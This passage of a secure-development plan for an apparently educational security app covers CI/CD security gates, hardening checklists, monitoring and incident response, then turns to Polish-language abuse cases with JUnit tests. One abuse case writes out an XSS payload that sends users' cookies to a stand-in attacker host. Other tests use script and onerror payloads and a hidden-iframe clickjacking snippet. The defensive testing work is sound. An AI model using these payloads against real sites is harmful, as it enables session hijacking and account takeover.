  3. Fix the vulnerability (GREEN)
  4. Verify the test passes and no other tests break
  5. Document the vulnerability class in the commit message
     (e.g., "fix: prevent SQL injection via framework filter param (CWE-89)")
  6. PR requires: security team review + original reporter sign-off
```

---

## Phase 5 — Deployment (Secure Release)

**Scrum mapping:** Sprint 8 + ongoing  
**SSDLC activity:** Infrastructure hardening, secrets management, production security headers, deployment verification

### 5.1 CI/CD Pipeline with Security Gates

```yaml
# .github/workflows/ci-cd.yml — full pipeline

name: SecureVision CI/CD

on: [push, pull_request]

jobs:
  # GATE 1: Secrets detection (fastest — runs first)
  secrets-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }  # full history for trufflehog
      - uses: trufflesecurity/trufflehog@main
        with: { path: './', base: '${{ github.base_ref }}' }

  # GATE 2: Backend unit + integration tests with SAST
  backend:
    needs: secrets-scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { java-version: '21', distribution: 'temurin' }
      - run: mvn -f backend/pom.xml verify
        # verify = compile + test + SpotBugs + OWASP Dependency Check

  # GATE 3: Frontend tests with SAST
  frontend:
    needs: secrets-scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - run: cd frontend && npm ci && npm run lint:security && npx vitest run --coverage
        # lint:security runs eslint-plugin-security + @microsoft/sdl

  # GATE 4: Docker build + container scan
  docker:
    needs: [backend, frontend]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker compose build
      - name: Scan backend image
        run: trivy image --exit-code 1 --severity HIGH,CRITICAL securevision-backend:latest
      - name: Scan frontend image
        run: trivy image --exit-code 1 --severity HIGH,CRITICAL securevision-frontend:latest

  # GATE 5: Deploy to staging + DAST
  staging:
    needs: docker
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: docker compose -f docker-compose.staging.yml up -d --wait
      - name: ZAP Baseline Scan
        run: |
          docker run --net=host ghcr.io/zaproxy/zaproxy:stable \
            zap-baseline.py -t http://localhost:8080 -r zap-report.html
      - uses: actions/upload-artifact@v4
        with: { name: zap-report, path: zap-report.html }

  # GATE 6: E2E tests including abuse cases
  e2e:
    needs: staging
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd e2e && npm ci && npx playwright test
      - uses: actions/upload-artifact@v4
        if: failure()
        with: { name: playwright-report, path: e2e/playwright-report/ }

  # PRODUCTION DEPLOY (manual approval required)
  production:
    needs: e2e
    if: github.ref == 'refs/heads/main'
    environment:
      name: production
      url: https://securevision.example.com
    runs-on: ubuntu-latest
    steps:
      - run: echo "Production deploy — requires manual approval in GitHub"
```

### 5.2 Infrastructure Hardening Checklist

Before any production release, verify this checklist (stored as a GitHub Issue template):

```markdown
## Pre-Production Security Checklist

### Nginx
- [ ] TLS 1.3 only (no TLS 1.0/1.1/1.2)
- [ ] HSTS header: max-age=31536000; includeSubDomains; preload
- [ ] Content-Security-Policy set (no unsafe-inline, no unsafe-eval)
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] Referrer-Policy: no-referrer
- [ ] Server header removed (server_tokens off)
- [ ] Rate limiting configured (limit_req_zone)
- [ ] Max body size: client_max_body_size 100k

### Spring Boot
- [ ] Actuator: only /health and /info exposed
- [ ] Spring Security: CSRF protection on admin endpoints
- [ ] JWT secret: read from environment variable (not application.yml)
- [ ] CORS: restricted to known frontend origin (not *)
- [ ] Logging: no PII or credentials in log output
- [ ] Stack traces: disabled in production profile

### PostgreSQL
- [ ] Admin superuser password changed from default
- [ ] sv_reader and sv_writer users created with minimal privileges
- [ ] pg_audit extension enabled for DDL + DML
- [ ] Network: port 5432 not exposed outside Docker network
- [ ] Backup encryption enabled

### Redis
- [ ] AUTH password set
- [ ] requirepass configured
- [ ] Network: port 6379 not exposed outside Docker network
- [ ] maxmemory-policy: allkeys-lru (prevents memory exhaustion)

### Docker
- [ ] All containers run as non-root users
- [ ] Read-only filesystems where possible
- [ ] No privileged containers
- [ ] Docker secrets used for passwords (not environment variables in compose)
- [ ] .dockerignore prevents .env and credentials from being included in images
```

### 5.3 Secrets Management

```
Development:  .env file (git-ignored), loaded by Docker Compose
Staging:      GitHub Actions Secrets → injected as environment variables
Production:   Docker Secrets or external vault (HashiCorp Vault / AWS Secrets Manager)

.env example (NEVER committed):
  POSTGRES_PASSWORD=<strong random password>
  REDIS_PASSWORD=<strong random password>
  JWT_SECRET=<256-bit random base64 string>
  JWT_EXPIRY_MINUTES=15
  ADMIN_EMAIL=admin@example.com
  ADMIN_INITIAL_PASSWORD=<strong random, force change on first login>
```

---

## Phase 6 — Maintenance & Runtime Monitoring

**Scrum mapping:** Ongoing after Sprint 8; Kanban for maintenance items  
**SSDLC activity:** Runtime anomaly detection, vulnerability patching, threat model updates

### 6.1 Runtime Monitoring Setup

```
Logging stack: Spring Boot → Logback JSON → Loki → Grafana

Alerts to configure (Grafana alerting rules):

  ALERT SEC-001: Authentication failure rate > 10/min from single IP
    → Possible brute force (OWASP A07)
    → Action: trigger IP block in Nginx, notify security team

  ALERT SEC-002: HTTP 429 rate > 50/min
    → Possible DoS attempt (OWASP A05, LLM10)
    → Action: page on-call, review Nginx rate limit config

  ALERT SEC-003: Any HTTP 500 from /api/admin/* endpoints
    → Possible privilege escalation attempt (OWASP A01)
    → Action: notify security team immediately

  ALERT SEC-004: Database query time > 3s (repeated 3 times in 1 min)
    → Possible query injection or DoS
    → Action: log full query, notify DBA

  ALERT SEC-005: JWT validation failures > 20/min
    → Possible token replay attack (OWASP A07)
    → Action: review Redis blacklist, check token issuer

  ALERT SEC-006: Export endpoint calls > 50/hour from single user
    → Possible bulk data exfiltration (OWASP A01)
    → Action: temporarily suspend export for that user, review logs
```

### 6.2 Patch Management Process (Kanban)

```
Kanban lane: SECURITY PATCH

  NEW CVE REPORTED
     │
     ▼
  TRIAGE (Severity ≥ 7.0? → escalate to CRITICAL lane, patch within 24h)
     │                       (Severity 4.0–7.0 → STANDARD lane, patch within 7 days)
     ▼
  ASSESS IMPACT (Is this dependency used in a reachable code path?)
     │
     ▼
  WRITE REGRESSION TEST (TDD — reproduce the vulnerability first)
     │
     ▼
  UPDATE DEPENDENCY (mvn versions:update or npm update)
     │
     ▼
  SEC REVIEW (confirm the update does not break DoD security gates)
     │
     ▼
  DEPLOY TO STAGING (run DAST + E2E)
     │
     ▼
  PRODUCTION DEPLOY
     │
     ▼
  CLOSE + UPDATE threat_model.md if a new attack surface was involved
```

### 6.3 Incident Response Plan

For a security incident in production:

```
STEP 1 — DETECT (< 5 min)
  Grafana alert fires → PagerDuty notification → on-call engineer

STEP 2 — CONTAIN (< 15 min)
  Option A: Block specific IP in Nginx immediately
  Option B: Take the affected endpoint offline (Nginx location block)
  Option C: Roll back to previous Docker image tag

STEP 3 — INVESTIGATE (< 2 hours)
  Pull logs from Loki for the affected time window
  Identify: what data was accessed, what was modified

STEP 4 — ERADICATE (< 24 hours)
  Fix the vulnerability following the patch management process
  Write regression test

STEP 5 — RECOVER
  Restore from backup if data was tampered
  Re-deploy fixed version

STEP 6 — POST-MORTEM (within 48 hours)
  Timeline of events
  Root cause analysis (which STRIDE category? which OWASP/MITRE ID?)
  Update threat_model.md
  Update security requirements in requirements.md
  If NIS2-applicable: report to CSIRT within 24h of detection
```

### 6.4 Threat Model Review Schedule

The threat model is a living document, not a one-time activity:

```
Review trigger     Frequency           Action
─────────────────  ──────────────────  ────────────────────────────────
New feature added  Per sprint          Review threat_model.md in Sprint Review
New dependency     Per Dependabot PR   Check if it adds attack surface
CVE published      As needed           Add to residual risk register
Security incident  After each incident Update threat model + controls
Quarterly review   Every 3 months      Full re-run of STRIDE workshop
```

---

## Phase 7 — AI/LLM-Specific SSDLC Considerations

This section addresses the unique security challenges that arise because this application **contains, displays, and teaches about** AI/LLM vulnerabilities. The application is not an AI system itself, but it handles AI attack patterns as content — which creates novel risks.

### 7.1 Attack Surfaces Unique to This Application

```
UNIQUE RISK 1: The application stores and displays real attack code

  Situation: The application's database contains working exploit snippets
             (attack demo code for SQL injection, prompt injection, etc.)
  Risk: If an admin account is compromised, an attacker could modify
        these snippets to deliver malicious code to developers who copy-paste them
  STRIDE: T (Tampering)
  Mitigation:
    - All code samples are version-controlled in Git (data/code_samples/)
    - Database content is reconciled against Git source on startup
    - Any deviation triggers an alert (content integrity check)
    - Admin changes require two-person approval (ITSM workflow)

UNIQUE RISK 2: Developers may copy-paste attack demo code into production

  Situation: The "Attack Example" tab shows vulnerable code (by design)
  Risk: A developer skips the "Defense Example" tab and copies the attack code
  STRIDE: T (Tampering of the developer's own system)
  Mitigation:
    - Attack demos have mandatory red border + "VULNERABLE — do not use" label
    - Copy button on Attack tab shows a confirmation dialog:
      "You are copying VULNERABLE code. Are you sure?"
    - Default Copy button copies the Defense Example
    - This UX is covered by component tests (FR-05.2, CodeSamplePanel.test.tsx)

UNIQUE RISK 3: The application is a high-value target for supply chain attacks

  Situation: Security teams use this app as a trusted reference
  Risk: If a malicious actor compromises the app's content,
        developers may implement backdoors believing they are "secure patterns"
  STRIDE: T (Tampering), S (Spoofing of authoritative content)
  Mitigation:
    - Content hash published alongside each release (SHA-256 of data/*.json)
    - Framework reference URLs link to official sources (OWASP, MITRE, CompTIA)
    - Disclaimer on every page: "Verify against official sources before production use"
    - All content changes go through the admin PR workflow with two-person approval

UNIQUE RISK 4: Search results could be used to discover attack patterns

  Situation: The app is intentionally a catalog of attack techniques
  Risk: Bad actors could use it to find attack code against their targets
  Assessment: ACCEPTABLE — the app teaches publicly documented frameworks.
              All content is already public on OWASP.org, MITRE ATLAS.
  Mitigation: None required beyond the standard access controls already in place.
              Rate limiting (AC-04) prevents automated bulk harvesting.
```

### 7.2 If AI Features Are Added (Future Sprint)

If a future sprint adds an AI-powered search assistant or code analysis feature, the following additional controls are required **before** that sprint begins (per SSDLC Phase 0 for the new feature):

```
OWASP LLM TOP 10 CONTROLS FOR ANY FUTURE AI FEATURE:

LLM01 Prompt Injection:
  Control: Separate system prompt from user input in all LLM calls
  Control: Output validation — LLM response must match expected schema (Zod)
  Control: Never allow LLM output to be executed as code

LLM06 Excessive Agency:
  Control: LLM assistant has READ-ONLY access to the threat database
  Control: No LLM agent can call external APIs, write files, or send emails
  Control: Human-in-the-loop for any action beyond text generation

LLM10 Unbounded Consumption:
  Control: Max token limit per request (e.g., 2000 input + 1000 output)
  Control: Rate limiting on AI assistant endpoint: 5 req/min per user
  Control: Monthly cost budget alert set in the AI provider account

Data Poisoning (LLM04):
  Control: The application's threat database is the RAG source — it must
           pass content integrity checks before being indexed for RAG
  Control: No dynamic, user-provided content fed into RAG without admin approval

MITRE ATLAS AML.T0024 (Model Extraction via API):
  Control: AI endpoint rate limited + requires authentication (no anonymous access)
  Control: Monitor for patterns of systematic response harvesting
```

---

## Phase 8 — Rozszerzenie SSDLC dla US-12–US-18 (Moduł Kart Cornucopia)

Sprints 9–16 dodają siedem nowych historyjek użytkownika opartych na talii kart OWASP Cornucopia. Z perspektywy SSDLC każda talia kart stanowi nowy **zasób treści** (content asset), który musi przejść przez wszystkie fazy bezpiecznego cyklu życia — od planowania wymagań bezpieczeństwa, przez bezpieczne projektowanie i implementację, po dedykowane testy i zarządzanie w runtime.

### 8.1 Macierz wymagań bezpieczeństwa dla US-12–US-18

Każda historia użytkownika implikuje wymagania bezpieczeństwa wynikające z **charakteru wyświetlanej treści** (karty opisują ataki), **nowych powierzchni ataku API** (nowe endpointy `/api/v1/threats?suit=FRE` itp.) i **potencjału nadużycia** (aplikacja demonstrująca BOT-ataki sama może paść ofiarą botów).

| US | Wymaganie bezpieczeństwa | Priorytet | Narzędzie weryfikacji |
|---|---|---|---|
| US-12 FRE | SR-12.1: Wszystkie opisy kart FRE przechodzą przez DOMPurify przed renderowaniem w React | BLOCKER | Vitest — `FrontendThreatCard.test.tsx` |
| US-12 FRE | SR-12.2: Identyfikatory OWASP Client-Side walidowane przez Server-Side allowlist `[A01–A10:2021, Client-Side C01–C10]` | HIGH | `OwaspRefValidatorTest.java` |
| US-12 FRE | SR-12.3: Rate limit na `/api/v1/threats?suit=FRE`: 60 req/min per IP; odpowiedź 429 po przekroczeniu | MEDIUM | `FrontendThreatControllerIT.java` |
| US-13 LLM | SR-13.1: Przykłady kodu prompt injection w kartach LLM oznaczone etykietą `PODATNY` + dialog ostrzeżenia przy kopiowaniu | BLOCKER | `CodeSamplePanel.test.tsx` |
| US-13 LLM | SR-13.2: Klucze macierzy LLM Top 10 (`LLM01:2025`–`LLM10:2025`) walidowane against allowlist — brak możliwości wstrzyknięcia klucza przez query param | HIGH | `LlmMatrixValidatorTest.java` |
| US-13 LLM | SR-13.3: Content integrity: SHA-256 hash każdego opisu karty LLM weryfikowany przy starcie aplikacji (plik `data/hashes.json`) | HIGH | `ContentIntegrityVerifierTest.java` |
| US-14 AAI | SR-14.1: Diagramy łańcucha agentów renderowane server-side jako SVG — brak JavaScript execution w SVG (`<script>` w SVG blokowany przez CSP) | BLOCKER | OWASP ZAP scan (CSP header check) |
| US-14 AAI | SR-14.2: Karty AAI z nadmierną agencją (AAIK, AAIQ) muszą wyświetlać widoczne ostrzeżenie `AUTONOMY RISK` — weryfikowane w testach komponentów | HIGH | `AgenticThreatCard.test.tsx` |
| US-15 STRIDE | SR-15.1: Heatmapa STRIDE budowana wyłącznie server-side — żadne dane heatmapy nie origin'ują od niezaufanego wejścia użytkownika | BLOCKER | `StrideHeatmapServiceTest.java` |
| US-15 STRIDE | SR-15.2: Endpoint `/api/v1/stride-heatmap` wymaga uwierzytelnienia JWT (admin lub user role) — weryfikacja IDOR | HIGH | `StrideThreatControllerIT.java` |
| US-16 MLSec | SR-16.1: Identyfikatory MITRE ATLAS walidowane przez allowlist technik (`T0001–T9999` rejected, tylko znane kody z ATLAS taxonomy) | HIGH | `MitreAtlasRefValidatorTest.java` |
| US-16 MLSec | SR-16.2: Karty EMR/EIR/EOR/EDR badge `ML-SPECIFIC` odróżniają je od OWASP Web Top 10 — brak mylącego mieszania kontekstów | MEDIUM | `MlSecCardBadgeTest.java` |
| US-17 Mobile | SR-17.1: Odwołania MASVS-* walidowane against OWASP MASVS 2.0 allowlist — brak możliwości wstrzyknięcia custom MASVS ID | HIGH | `MasvsBadgeValidatorTest.java` |
| US-17 Mobile | SR-17.2: Tabela porównania MASVS vs OWASP Web Top 10 budowana statycznie — brak dynamicznych query params kształtujących strukturę tabeli | MEDIUM | `MobileVsWebMatrixControllerIT.java` |
| US-18 DVO/BOT | SR-18.1: Przykłady kart DVO dotyczące CI/CD zawierają wyłącznie pseudokod (nie działający YAML workflow) — weryfikowane przez code review | BLOCKER | Manual review checklist |
| US-18 DVO/BOT | SR-18.2: Demonstracje ataków BOT (credential stuffing, scraping) mają podwójne ostrzeżenia etyczne i wymagają kliknięcia `Rozumiem ryzyko` przed wyświetleniem | HIGH | `BotCardWarningTest.java` |
| US-18 DVO/BOT | SR-18.3: Własna aplikacja spełnia wymagania ochrony przed botami, które sama demonstruje (rate limiting, CAPTCHA na rejestracji admina) | HIGH | `AC-09` abuse case test |

### 8.2 Nowe przypadki nadużyć (AC-09 – AC-13)

Przypadki AC-09–AC-13 wywodzą się bezpośrednio ze scenariuszy kart Cornucopia obsługiwanych przez US-12–US-18 — aplikacja musi być odporna na zagrożenia, które sama prezentuje użytkownikom.

#### AC-09: Masowe pobieranie treści kart przez boty (BOT — BOTK, OAT-011 Scraping)

```
Aktor:      zautomatyzowany bot (karta BOTK — EDVAC Scraping)
Cel:        wyeksportować całą bazę kart Cornucopia przez API bez limitu
Atak:       bot wysyła 200+ GET /api/v1/threats?suit=LLM&page=0..N w ciągu 1 minuty
STRIDE:     D (Denial of Service przez zużycie zasobów)
Mitigacja:  Rate limit: 60 req/min per IP (Bucket4j); po 61. żądaniu HTTP 429 z Retry-After header
            Łączny limit 1000 req/godzinę per IP na wszystkich /api/v1/threats endpoints
Akceptacja: [ ] HTTP 429 zwrócone przy 61. żądaniu
            [ ] Retry-After header obecny w 429
            [ ] Żaden endpoint nie zwraca całego zbioru bez paginacji

Test JUnit:
  @Test
  void rateLimitExceeded_returns429WithRetryAfter() {
    for (int i = 0; i < 60; i++) {
      given().when().get("/api/v1/threats?suit=LLM").then().statusCode(200);
    }
    given().when().get("/api/v1/threats?suit=LLM")
      .then().statusCode(429).header("Retry-After", notNullValue());
  }
```

#### AC-10: XSS przez pole opisu karty w panelu admina (FRE — FRE4, DOM-based XSS)

```
Aktor:      skompromitowany konto admin
Cel:        wstrzyknąć <script> do opisu karty FRE, który wykona się w przeglądarkach użytkowników
Atak:       PUT /api/v1/admin/threats/FRE4
            body: { "descriptionPl": "<script>document.location='evil.com?c='+document.cookie</script>" }
STRIDE:     T (Tampering treści), E (Elevation — kradzież sesji innego admina)
Mitigacja:  1. Backend: Bean Validation + OwaspJavaHtmlSanitizer na wszystkich desc polach
            2. Frontend: DOMPurify przed każdym renderowaniem opisu karty
            3. CSP header: script-src 'self' — blokuje inline scripts
Akceptacja: [ ] Backend odrzuca payload zawierający <script> (HTTP 400)
            [ ] Jeśli przez — DOMPurify stripuje <script> przed renderowaniem
            [ ] CSP header blokuje wykonanie inline skryptów

Test JUnit:
  @Test
  void adminUpdateCard_withScriptTag_returns400() {
    String xssPayload = """
        {"descriptionPl": "<script>alert('xss')</script>Opis"}
        """;
    given().auth().jwt(adminToken)
      .contentType("application/json").body(xssPayload)
      .when().put("/api/v1/admin/threats/FRE4")
      .then().statusCode(400)
      .body("errors[0].field", equalTo("descriptionPl"));
  }
```

#### AC-11: Manipulacja plikami YAML kart w pipeline CI/CD (DVO — DVO8, DVOK)

```
Aktor:      atakujący z dostępem do repozytorium (skompromitowany token CI)
Cel:        zmodyfikować plik data/cornucopia/llm-cards.yaml — wstrzyknąć fałszywy opis
            zawierający podatny kod jako "bezpieczny wzorzec"
Atak:       git push --force modyfikacji YAML do gałęzi main z obejściem branch protection
STRIDE:     T (Tampering), S (Spoofing autorytatywnej treści)
Mitigacja:  1. data/hashes.json: SHA-256 każdego pliku YAML zaktualizowany przez CI po merge
            2. ContentIntegrityVerifier: Spring Boot startup hook weryfikuje hashes.json
            3. Branch protection: required 2 approvers + CODEOWNERS dla data/ katalogu
            4. Zmiana YAML wymaga PR — nie ma możliwości edycji bezpośredniej w DB
Akceptacja: [ ] ContentIntegrityVerifier odrzuca start aplikacji jeśli hash się nie zgadza
            [ ] Test symuluje modyfikację YAML bez aktualizacji hashes.json → startup fail

Test JUnit:
  @Test
  void startupFails_whenYamlHashMismatch() {
    // modify YAML in test resources, but leave hashes.json unchanged
    assertThatThrownBy(() -> ctx.refresh())
      .hasCauseInstanceOf(ContentIntegrityException.class)
      .hasMessageContaining("Hash mismatch: llm-cards.yaml");
  }
```

#### AC-12: Obejście walidacji identyfikatorów MITRE ATLAS (MLSec — EMRX)

```
Aktor:      użytkownik API (lub skompromitowany admin)
Cel:        wstrzyknąć nieistniejący identyfikator MITRE ATLAS np. "T9999-malicious"
            jako referencję do karty MLSec, co zdyskredytuje treść edukacyjną
Atak:       POST /api/v1/admin/threats/EMRX
            body: { "mitreRefs": ["T9999-malicious", "T0010"] }
STRIDE:     T (Tampering danych referencyjnych)
Mitigacja:  MitreAtlasRefValidator: allowlist dozwolonych kodów technik z ATLAS taxonomy
            (ładowana przy starcie z pliku data/mitre-atlas-allowlist.json)
Akceptacja: [ ] HTTP 400 przy próbie zapisu nieznanego MITRE kodu
            [ ] Znany kod T0010 akceptowany normalnie

Test JUnit:
  @Test
  void saveMitreRef_withUnknownCode_returns400() {
    given().auth().jwt(adminToken).contentType("application/json")
      .body("""{"mitreRefs": ["T9999-malicious"]}""")
      .when().put("/api/v1/admin/threats/EMRX")
      .then().statusCode(400)
      .body("errors[0].field", equalTo("mitreRefs[0]"));
  }
```

#### AC-13: Clickjacking strony heatmapy STRIDE (FRE — FREX)

```
Aktor:      zewnętrzna strona ładująca SecureVision w iframe
Cel:        nakłonić administratora do kliknięcia "Zatwierdź zmianę treści"
            wewnątrz ukrytego iframe z SecureVision /stride-heatmap
Atak:       <iframe src="https://securevision.app/stride-heatmap" style="opacity:0; ...">
STRIDE:     E (Elevation of Privilege przez UI redressing)
Mitigacja:  X-Frame-Options: DENY na wszystkich stronach
            CSP: frame-ancestors 'none'
            Spring Security: .frameOptions(fo -> fo.deny())
Akceptacja: [ ] Response header X-Frame-Options: DENY na /stride-heatmap
            [ ] Response header Content-Security-Policy zawiera frame-ancestors 'none'

Test JUnit:
  @Test
  void strideHeatmap_hasXFrameOptionsDeny() {
    given().when().get("/stride-heatmap")
      .then().header("X-Frame-Options", equalTo("DENY"))
      .header("Content-Security-Policy", containsString("frame-ancestors 'none'"));
  }
```

### 8.3 Nowe decyzje projektowe (D-09 – D-13)

#### D-09: Pliki YAML kart są niemutowalne w runtime

```
Decyzja:  Pliki data/cornucopia/*.yaml ładowane jednorazowo przy starcie aplikacji.
          Po załadowaniu zawartość jest read-only w pamięci. Żadna ścieżka kodu
          nie zapisuje do tych plików w runtime.
Powód:    Zapobiega atakom AC-11 (YAML tampering) i zmniejsza powierzchnię ataku
          DevOps (DVO — DVOK supply chain).
          Treść może być aktualizowana tylko przez Git PR workflow z 2 approvers.
Weryfikacja: ContentIntegrityVerifier uruchamiany w @PostConstruct Springa —
          zatrzymuje start przy niezgodności SHA-256 z data/hashes.json.
```

#### D-10: Wszystkie identyfikatory OWASP/MASVS/MITRE walidowane przez server-side allowlisty

```
Decyzja:  Przy każdym zapisie do bazy (admin CRUD) identyfikatory referencyjne
          (owaspRefs, mitreRefs, mavsRefs, cicdSecRefs, oatRefs) są walidowane
          przez serwisowe klasy *RefValidator.java wczytujące allowlist z pliku
          data/ref-allowlists.json (wersjonowanego w repozytorium).
Powód:    Zapobiega wstrzyknięciu fikcyjnych identyfikatorów (AC-12) i utrzymuje
          integralność treści edukacyjnej.
Nowe klasy: OwaspRefValidator, MitreAtlasRefValidator, MavsRefValidator,
            CicdSecRefValidator, OatRefValidator — wszystkie @Component Spring.
```

#### D-11: Aplikacja demonstrująca BOT musi spełniać własne wymagania ochrony przed botami

```
Decyzja:  Każde zabezpieczenie pokazane w kartach BOT (rate limiting, CAPTCHA,
          behavioral analytics) musi być wdrożone w samej aplikacji.
          "Dogfooding" OWASP Automated Threats własnym przykładem.
Powód:    Autentyczność demonstracji — aplikacja nie może uczyć obrony, której sama
          nie stosuje (byłoby to fałszywe świadectwo).
Implementacja:
  - Rate limiting Bucket4j: wszystkie /api/v1/ endpoints — 60 req/min per IP
  - Admin rejestracja/zmiana hasła: Cloudflare Turnstile (CAPTCHA) lub reCAPTCHA v3
  - Loki alert SEC-007: > 50 unique /api/v1/threats requests/min z jednego IP
```

#### D-12: Diagramy łańcucha agentów AI renderowane server-side (US-14 AAI)

```
Decyzja:  Diagramy wizualizujące zaufanie między agentami AI (AAI cards) są
          generowane server-side jako SVG przez libraryJFreeChart/Mermaid server-side
          — nie przez dynamiczny JavaScript po stronie klienta.
Powód:    Zapobiega SVG injection (AC-10 wariant) i jest zgodny z SR-14.1.
          CSP header blokuje <script> w SVG nawet gdy byłoby wstrzyknięte.
Weryfikacja: Integration test sprawdza, że endpoint /api/v1/threats/AAI*/diagram
          zwraca Content-Type: image/svg+xml, a nie text/javascript.
```

#### D-13: Treść kart DVO dotycząca CI/CD zawiera tylko pseudokod

```
Decyzja:  Przykłady kodu w kartach DVO (DevOps supply chain) używają pseudokodu
          lub anonimizowanych szablonów YAML pipeline — nigdy realnych credentials,
          nazw repozytoriów, ani działających exploitów pipeline.
Powód:    Zgodny z UNIQUE RISK 1 (Phase 7): aplikacja nie może być wektorem
          ataku supply chain przez własne przykłady kodu (SR-18.1).
Weryfikacja: Manual checklist przy PR review każdej karty DVO — CODEOWNERS: @security-team.
```

### 8.4 Aktywności bezpieczeństwa w sprintach 9–16

#### Sprint 9 — US-12 (FRE Frontend) + US-13 (LLM)

```
Bezpieczeństwo w tym sprincie:
  Dzień 1:  SR-12.1: DOMPurify zintegrowany w FrontendThreatCard.tsx
            Test RED: FrontendThreatCard.test.tsx — <script> stripped by DOMPurify
  Dzień 2:  Abuse case AC-10 (XSS przez admin) napisany jako test (RED)
  Dzień 3:  SR-13.1: PODATNY label na kartach LLM — test komponentu napisany (RED)
            Rate limit SR-12.3 dodany do /api/v1/threats?suit=FRE (Bucket4j)
  Dzień 5:  (Security Gate Review)
              - Sprawdź: żaden nowy komponent nie używa dangerouslySetInnerHTML
              - Sprawdź: OWASP ref IDs przechodzą allowlist validator
              - Sprawdź: Content-Security-Policy header zawiera script-src 'self'
  Dzień 7:  Abuse case AC-10 implementacja: OwaspJavaHtmlSanitizer na admin PUT endpoint
  Dzień 9:  XSS smoke test: submit <img onerror="alert(1)"> jako descriptionPl → expect 400
  Dzień 10: DoD check: SpotBugs 0 HIGH, npm audit 0 critical, DOMPurify wersja >= 3.0
```

#### Sprint 10 — US-14 (AAI Agentic AI) + US-15 (STRIDE EoP)

```
Bezpieczeństwo w tym sprincie:
  Dzień 1:  SR-14.1: SVG rendering test — /api/v1/threats/AAIK/diagram → Content-Type: image/svg+xml
  Dzień 2:  SR-15.1: StrideHeatmapService — unit test weryfikuje brak user-input w heatmap logic
  Dzień 3:  Abuse case AC-13 (clickjacking heatmapy) napisany jako test (RED)
            X-Frame-Options: DENY dodany do Spring Security config dla /stride-heatmap
  Dzień 5:  (Security Gate Review)
              - Sprawdź: /api/v1/stride-heatmap wymaga tokenu JWT (zwraca 401 bez tokenu)
              - Sprawdź: X-Frame-Options: DENY w nagłówku odpowiedzi
              - Sprawdź: CSP header dla /stride-heatmap zawiera frame-ancestors 'none'
  Dzień 7:  SR-14.2: AUTONOMY RISK badge na AAIK i AAIQ — test komponentu GREEN
  Dzień 10: DoD check: DAST ZAP baseline scan — 0 MEDIUM+ findings na nowych endpointach
```

#### Sprint 11 — US-16 (MLSec) + Pipeline bezpieczeństwa treści YAML

```
Bezpieczeństwo w tym sprincie:
  Dzień 1:  ContentIntegrityVerifier napisany (RED — AC-11 test musi zdać)
            data/hashes.json wygenerowany przez nowy CI job: hash-generator
  Dzień 2:  SR-16.1: MitreAtlasRefValidator — allowlist technik ATLAS załadowana z JSON
            Abuse case AC-12 (MITRE allowlist bypass) napisany jako test (RED)
  Dzień 3:  D-09: ContentIntegrityVerifier @PostConstruct — test startupu z zmanipulowanym YAML
  Dzień 5:  (Security Gate Review)
              - Sprawdź: aplikacja odmawia startu gdy SHA-256 nie zgadza się z hashes.json
              - Sprawdź: AC-12 test GREEN (T9999-malicious odrzucone HTTP 400)
              - Sprawdź: branch protection CODEOWNERS dla data/cornucopia/
  Dzień 7:  SR-16.2: ML-SPECIFIC badge — unit test weryfikuje brak mieszania OWASP Web i MLSec refs
  Dzień 10: DoD check: ContentIntegrityVerifierTest GREEN + SAST 0 HIGH
```

#### Sprint 12 — US-17 (Mobile MASVS)

```
Bezpieczeństwo w tym sprincie:
  Dzień 1:  SR-17.1: MavsRefValidator — allowlist MASVS 2.0 załadowana
            Test: "MASVS-NETWORK-999" odrzucone HTTP 400
  Dzień 2:  Kotlin/Swift code examples review checklist — senior dev + security engineer
  Dzień 3:  SR-17.2: MobileVsWebMatrixController — test weryfikuje brak dynamicznych query params
            wpływających na strukturę tabeli (tylko predefiniowane kolumny)
  Dzień 5:  (Security Gate Review)
              - Sprawdź: żaden kod Kotlin/Swift nie zawiera działającego exploita
              - Sprawdź: MavsRefValidator odrzuca nieznane MASVS ID
              - Sprawdź: certyfikat pinning przykład (NSX card) pokazuje TYLKO ochronę, nie bypass
  Dzień 10: DoD check: mobile comparison endpoint 200 na /api/v1/matrix/mobile-vs-web
```

#### Sprint 13 — US-18 (DevOps DVO + BOT)

```
Bezpieczeństwo w tym sprincie:
  Dzień 1:  SR-18.1: Code review checklist dla kart DVO — CODEOWNERS trigger dla data/cornucopia/dvo-cards.yaml
            D-13 weryfikacja: żaden YAML kart DVO nie zawiera realnych credentials ani token'ów
  Dzień 2:  SR-18.2: BotCardWarning component — test: kliknięcie "Rozumiem ryzyko" wymagane przed
            wyświetleniem kart BOTX, BOTJ (credential enumeration examples)
  Dzień 3:  D-11: Własna rate limiting dla /api/v1/threats endpoints — test AC-09 (RED)
            Bucket4j config: 60 req/min per IP dla wszystkich suit endpoints
  Dzień 5:  (Security Gate Review)
              - Sprawdź: AC-09 test GREEN (HTTP 429 przy 61. żądaniu)
              - Sprawdź: SR-18.2: BotCardWarning wymagany dla kart credential enumeration
              - Sprawdź: Loki alert SEC-007 skonfigurowany (> 50 req/min z jednego IP)
  Dzień 7:  CicdSecRefValidator — allowlist CICD-SEC-01..10 załadowana
            OatRefValidator — allowlist OAT-001..OAT-021 załadowana
  Dzień 10: DoD check: DAST ZAP scan /frameworks/devops-security — 0 MEDIUM+ findings
```

#### Sprints 14–16 — Integracja, Full Security Test, Production Release

```
Sprint 14 (Integracja cross-reference):
  - Test: każda karta z każdego suit ma co najmniej jeden OWASP ref (sprawdzenie kompletności)
  - Test: macierz LLM × Agentic AI ma 10 wierszy (LLM01–LLM10) × 10 kolumn (AgentAI01–AgentAI10)
  - Aktualizacja threat_model.md o nowe komponenty: Card Browser, Matrix Page, STRIDE Heatmap
  - STRIDE analiza nowych komponentów: Card Browser (powierzchnia ataku: card ID injection, XSS)

Sprint 15 (Pełna kampania testów bezpieczeństwa):
  - OWASP ZAP full active scan wszystkich nowych endpointów (/frameworks/*, /matrix/*)
  - Abuse cases AC-09–AC-13: wszystkie GREEN przed przejściem do Sprint 16
